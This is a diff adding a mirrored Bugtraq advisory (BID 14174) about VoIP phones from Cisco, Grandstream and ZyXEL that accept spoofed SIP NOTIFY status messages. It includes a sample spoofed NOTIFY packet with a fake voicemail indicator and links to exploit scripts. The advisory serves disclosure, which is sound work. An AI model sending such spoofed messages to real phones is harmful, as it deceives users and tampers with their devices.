@@ -1,0 +1,121 @@
+#SpeeDr00t@Black Falcon<br>#bid14174<p><b><span style="font-size: 18pt;">Multiple Vendor VoIP Phones Spoofed SIP Status Message Handling Weakness</span></b></p><br><br><a href="http://www.securityfocus.com/bid/14174/info">info</a><br><a href="http://www.securityfocus.com/bid/14174/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/14174/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/14174/solution">solution</a><br><a href="http://www.securityfocus.com/bid/14174/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				14174
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 06 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 06 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to Tobias Glemser &lt;tglemser@tele-consulting.com&gt;.  Javor Ninov &lt;drfrancky@securax.org&gt; reported that this issue affects ZyXEL.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					ZyXEL Prestige 2000W VoIP Wi-Fi Phone  <br/>
+					
+				
+					ZyXEL Prestige 2000W  <br/>
+					
+				
+					Grandstream BudgeTone 100  <br/>
+					
+				
+					Cisco VoIP Phone CP-7960 3.2 <br/>
+					
+				
+					Cisco VoIP Phone CP-7960 3.1 <br/>
+					
+				
+					Cisco VoIP Phone CP-7960 3.0 <br/>
+					
+				
+					Cisco VoIP Phone CP-7940 3.2 <br/>
+					
+				
+					Cisco VoIP Phone CP-7940 3.1 <br/>
+					
+				
+					Cisco VoIP Phone CP-7940 3.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x15000/14174/SIP_NOTIFY_POC.pl">#exploit_SIP_NOTIFY_POC.pl</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x15000/14174/snf.zip">#exploit_snf.zip</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required.<br/><br/>The following proof of concept example is available:<br/>UDP-Message from Attacker to Victim<br/><br/>        Session Initiation Protocol<br/>             Request-Line: NOTIFY sip:login@10.1.1.2 SIP/2.0<br/>             Message Header<br/>                Via: SIP/2.0/UDP 15.1.1.12:5060;branch=000000000000000<br/>                From: "asterisk" &lt;sip:asterisk@10.1.1.1&gt;;tag=000000000<br/>                To: &lt;sip:login@10.1.1.2&gt;<br/>                Contact: &lt;sip:asterisk@10.1.1.1&gt;<br/>                Call-ID: 00000000000000@10.1.1.1<br/>                CSeq: 102 NOTIFY<br/>                User-Agent: Asterisk PBX<br/>                Event: message-summary<br/>                Content-Type: application/simple-message-summary<br/>                Content-Length: 37<br/>        Message body<br/>                Messages-Waiting: yes\n<br/>                Voicemail: 3/2\n<br/><br/>A proof of concept (SIP_NOTIFY_POC.pl) has been supplied by &lt;DrFrancky@securax.org&gt;.<br/><br/>Tobias Glemser &lt;tglemser@tele-consulting.com&gt; has provided an exploit (snf.zip) as well:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/SIP_NOTIFY_POC.pl">/data/vulnerabilities/exploits/SIP_NOTIFY_POC.pl</a></li>
+<li><a href="/data/vulnerabilities/exploits/snf.zip">/data/vulnerabilities/exploits/snf.zip</a></li>
+</ul>
+</div>
